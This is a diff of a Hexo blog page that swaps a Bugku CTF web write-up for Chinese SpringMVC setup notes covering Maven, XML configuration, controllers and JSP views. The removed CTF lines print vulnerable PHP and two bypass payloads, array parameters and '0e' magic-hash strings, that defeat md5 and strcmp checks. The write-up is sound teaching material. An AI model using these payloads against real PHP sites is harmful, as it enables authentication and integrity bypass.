@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Hexo</title>
+  <title>springMVC笔记 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/page/6/index.html">
+  <meta name="description" content="SpringMVC MVC：模型（dao，service），视图（jsp），控制器（Servlet）导包： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="springMVC笔记">
+<meta property="og:url" content="http://example.com/2022/03/20/springMVC%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SpringMVC MVC：模型（dao，service），视图（jsp），控制器（Servlet）导包： 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&amp;quo">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-20T13:33:52.000Z">
+<meta property="article:modified_time" content="2022-03-20T13:34:32.581Z">
 <meta property="article:author" content="ouroborosscr">
 <meta name="twitter:card" content="summary">
   
@@ -162,47 +166,113 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-bugku-web-前女友" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-springMVC笔记" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/">bugku-web-前女友</a>
+    <h1 class="article-title" itemprop="name">
+      springMVC笔记
     </h1>
   
 
         
         
 
+	<span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+		  <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+	</span>
 
-<a href="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/" class="archive-article-date">
-  	<time datetime="2021-08-10T11:41:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-10</time>
+
+
+<a href="/2022/03/20/springMVC%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-03-20T13:33:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>打开后是一个没什么意思的冷笑话</p>
-<img src="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/1.PNG" class="" title="1.PNG">
-<p>f12后发现一个链接，点开后发现php源码</p>
-<img src="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/2.PNG" class="" title="2.PNG">
-<img src="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/3.PNG" class="" title="3.PNG">
+        <p>SpringMVC</p>
+<p>MVC：模型（dao，service），视图（jsp），控制器（Servlet）<br>导包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.kuang&lt;&#x2F;groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;SpringMVC&lt;&#x2F;artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;11&lt;&#x2F;maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;11&lt;&#x2F;maven.compiler.target&gt;</span><br><span class="line">    &lt;&#x2F;properties&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;junit&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.12&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;spring-webmvc&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;5.3.16&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;servlet-api&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.5&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet.jsp&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jsp-api&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.2&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;jstl&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">    &lt;&#x2F;dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;project&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;</span><br><span class="line">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class="line">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class="line">    $v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class="line">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>首先解决这玩意——<code>strcmp($v3, $flag)</code>,没有人能猜出flag的内容，所以数组绕过，传值<code>v3[]=3</code></p>
-<p>然后就是典型的md5碰撞</p>
-<p>方法一：数组绕过<br>令：v1,v2都是数组，然后赋不同值（<code>$v1 != $v2</code>）。因为数组状态下<code>md5()</code>函数会自动返回null<br>所以传值：?v1[]=1&amp;v2[]=2&amp;v3[]=3<br>得到flag</p>
-<img src="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/4.PNG" class="" title="4.PNG">
+<p>创建文件夹后直接右键“添加框架支持”，选中web，点ok，就会自动创建web文件夹</p>
+<p>创建jsp/hello.jsp文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: 30389</span><br><span class="line">  Date: 2022&#x2F;3&#x2F;16</span><br><span class="line">  Time: 20:15</span><br><span class="line">  To change this template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Kuangshen&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">$&#123;msg&#125;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>springmvc-servlet.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">       xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">       xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">       http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;bean class&#x3D;&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot;&#x2F;&gt;</span><br><span class="line">    &lt;bean class&#x3D;&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;&#x2F;&gt;</span><br><span class="line">    &lt;!--视图解析器:DispatcherServlet给他的ModelAndView--&gt;</span><br><span class="line">    &lt;bean class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot; id&#x3D;&quot;InternalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;!--前缀--&gt;</span><br><span class="line">        &lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;&quot;&#x2F;&gt;</span><br><span class="line">        &lt;!--后缀--&gt;</span><br><span class="line">        &lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;bean&gt;</span><br><span class="line"></span><br><span class="line">    &lt;bean id&#x3D;&quot;&#x2F;hello&quot; class&#x3D;&quot;com.kuang.controller.HelloController&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
+<p>HelloController.class</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.web.servlet.ModelAndView;</span><br><span class="line">import org.springframework.web.servlet.mvc.Controller;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;先导入接口（真实开发不会这么写，只是为了讲原理）</span><br><span class="line">public class HelloController implements Controller &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public ModelAndView handleRequest(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F;ModelAndView 模型和视图</span><br><span class="line">        ModelAndView mv &#x3D; new ModelAndView();</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;封装对象，放在ModelAndView中。Model</span><br><span class="line">        mv.addObject(&quot;msg&quot;,&quot;HelloSpringMVC!&quot;);</span><br><span class="line">        &#x2F;&#x2F;封装要跳转的视图，放在ModelAndView中</span><br><span class="line">        mv.setViewName(&quot;hello&quot;); &#x2F;&#x2F;: &#x2F;WEB-INF&#x2F;jsp&#x2F;hello.jsp</span><br><span class="line">        return mv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>刚运行可能会404，这边显示的是缺java EE 6,下载<br>然后是导新文件的jar包（不是01，而是02的）<br>完成以后发现卵用没有——如果jar包存在，显示无法输出，就在IDEA的项目发布中，添加lib依赖！<br>（“文件”–“项目结构”–“工件”，在WEB-INF底下加lib文件夹，然后点导包，把所有包导进去）（idea的历史遗留问题）</p>
+<p>玩了一圈发现：tomcat10不能用javax，要用jakarta，但是这个程序必须要引用javax，所以必定会404，解决方法：换tomcat9<br>（大部分都能换jakarta，但是jstl需要这个：<a target="_blank" rel="noopener" href="https://blog.csdn.net/amiao_2018/article/details/116357125">https://blog.csdn.net/amiao_2018/article/details/116357125</a> )<br>然后springmvc直接引用的javax包，没有引用jakarta的版本  ——2022.3.16</p>
+<p>实际操作不会像上面那么写，因为太麻烦，会直接用注解，这只是讲原理</p>
+<p>使用注解开发SpringMVC：<br>由于Maven可能存在资源过滤的问题，我们将配置完善(只要是maven就加上就行）:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">   &lt;resources&gt;</span><br><span class="line">       &lt;resource&gt;</span><br><span class="line">           &lt;directory&gt;src&#x2F;main&#x2F;java&lt;&#x2F;directory&gt;</span><br><span class="line">           &lt;includes&gt;</span><br><span class="line">               &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt;</span><br><span class="line">               &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt;</span><br><span class="line">           &lt;&#x2F;includes&gt;</span><br><span class="line">           &lt;filtering&gt;false&lt;&#x2F;filtering&gt;</span><br><span class="line">       &lt;&#x2F;resource&gt;</span><br><span class="line">       &lt;resource&gt;</span><br><span class="line">           &lt;directory&gt;src&#x2F;main&#x2F;resources&lt;&#x2F;directory&gt;</span><br><span class="line">           &lt;includes&gt;</span><br><span class="line">               &lt;include&gt;**&#x2F;*.properties&lt;&#x2F;include&gt;</span><br><span class="line">               &lt;include&gt;**&#x2F;*.xml&lt;&#x2F;include&gt;</span><br><span class="line">           &lt;&#x2F;includes&gt;</span><br><span class="line">           &lt;filtering&gt;false&lt;&#x2F;filtering&gt;</span><br><span class="line">       &lt;&#x2F;resource&gt;</span><br><span class="line">   &lt;&#x2F;resources&gt;</span><br><span class="line">&lt;&#x2F;build&gt;</span><br></pre></td></tr></table></figure>
 
-<p>方法二：md5碰撞<br>有很多字符串加密后回以0e开头，而php的弱等比的是第一个非数字的字符，所以可以用来利用。<br>随便找两个构造payload：?v1=s1502113478a&amp;v2=s1091221200a&amp;v3[]=3<br>得到flag</p>
-<img src="/2021/08/10/bugku-web-%E5%89%8D%E5%A5%B3%E5%8F%8B/5.PNG" class="" title="5.PNG">
+<p>自动生成web文件夹，导入lib</p>
+<p>web.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&quot;</span><br><span class="line">         xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">         version&#x3D;&quot;4.0&quot;&gt;</span><br><span class="line">    &lt;!--1.注册servlet--&gt;</span><br><span class="line">    &lt;servlet&gt;</span><br><span class="line">        &lt;servlet-name&gt;SpringMVC&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">        &lt;!--通过初始化参数指定SpringMVC配置文件的位置，进行关联--&gt;</span><br><span class="line">        &lt;init-param&gt;</span><br><span class="line">            &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt;</span><br><span class="line">            &lt;param-value&gt;classpath:springmvc-servlet.xml&lt;&#x2F;param-value&gt;</span><br><span class="line">        &lt;&#x2F;init-param&gt;</span><br><span class="line">        &lt;!-- 启动顺序，数字越小，启动越早 --&gt;</span><br><span class="line">        &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt;</span><br><span class="line">    &lt;&#x2F;servlet&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--所有请求都会被springmvc拦截 --&gt;</span><br><span class="line">    &lt;servlet-mapping&gt;</span><br><span class="line">        &lt;servlet-name&gt;SpringMVC&lt;&#x2F;servlet-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt;</span><br><span class="line">    &lt;&#x2F;servlet-mapping&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>springmvc-servlet.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">      xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">      xmlns:context&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&quot;</span><br><span class="line">      xmlns:mvc&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc&quot;</span><br><span class="line">      xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">       http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">       http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context</span><br><span class="line">       https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;context&#x2F;spring-context.xsd</span><br><span class="line">       http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc</span><br><span class="line">       https:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;mvc&#x2F;spring-mvc.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!-- 自动扫描包，让指定包下的注解生效,由IOC容器统一管理 --&gt;</span><br><span class="line">   &lt;context:component-scan base-package&#x3D;&quot;com.kuang.controller&quot;&#x2F;&gt;</span><br><span class="line">   &lt;!-- 让Spring MVC不处理静态资源 css js html mp3 mp4--&gt;</span><br><span class="line">   &lt;mvc:default-servlet-handler &#x2F;&gt;</span><br><span class="line">   &lt;!--</span><br><span class="line">   支持mvc注解驱动</span><br><span class="line">       在spring中一般采用@RequestMapping注解来完成映射关系</span><br><span class="line">       要想使@RequestMapping注解生效</span><br><span class="line">       必须向上下文中注册DefaultAnnotationHandlerMapping</span><br><span class="line">       和一个AnnotationMethodHandlerAdapter实例</span><br><span class="line">       这两个实例分别在类级别和方法级别处理。</span><br><span class="line">       而annotation-driven配置帮助我们自动完成上述两个实例的注入。</span><br><span class="line">    --&gt;</span><br><span class="line">   &lt;mvc:annotation-driven &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!-- 视图解析器 --&gt;</span><br><span class="line">   &lt;bean class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span><br><span class="line">         id&#x3D;&quot;internalResourceViewResolver&quot;&gt;</span><br><span class="line">       &lt;!-- 前缀 --&gt;</span><br><span class="line">       &lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;&quot; &#x2F;&gt;</span><br><span class="line">       &lt;!-- 后缀 --&gt;</span><br><span class="line">       &lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot; &#x2F;&gt;</span><br><span class="line">   &lt;&#x2F;bean&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这几个配置文件以后就不可能动了！！！</p>
+<p>HelloController.java</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@Controller &#x2F;&#x2F;自动被扫描，不用在xml注册了</span><br><span class="line">@RequestMapping(&quot;&#x2F;mvc&quot;)</span><br><span class="line">public class HelloController &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;hello&quot;) &#x2F;&#x2F;使用hello请求,路径……&#x2F;mvc&#x2F;hello</span><br><span class="line">    public String hello(Model model) &#123;</span><br><span class="line">        &#x2F;&#x2F;封装数据</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,&quot;Hello,SpringMVCAnnotation!&quot;)</span><br><span class="line">        return &quot;hello&quot;;&#x2F;&#x2F;会被视图解析器自动处理</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>hello.jsp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">$&#123;msg&#125;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后就收工了，真就傻子编程了</p>
+<p>传统方式：<br>GET传参：访问<a target="_blank" rel="noopener" href="http://localhost:8080/springmvc_03_annotation_war_exploded/add?a=1&amp;b=2">http://localhost:8080/springmvc_03_annotation_war_exploded/add?a=1&amp;b=2</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package com.kuang.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class RestFulController &#123;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;add&quot;)</span><br><span class="line">    public String test1(int a, int b, Model model)&#123;</span><br><span class="line">        int res&#x3D;a+b;</span><br><span class="line">        model.addAttribute(&quot;msg&quot;,&quot;结果为&quot;+res);</span><br><span class="line">        return &quot;test&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>RestFul风格：<br>（感觉这就是ssrf漏洞的源头）<br>访问<a target="_blank" rel="noopener" href="http://localhost:8080/springmvc_03_annotation_war_exploded/add/1/2">http://localhost:8080/springmvc_03_annotation_war_exploded/add/1/2</a></p>
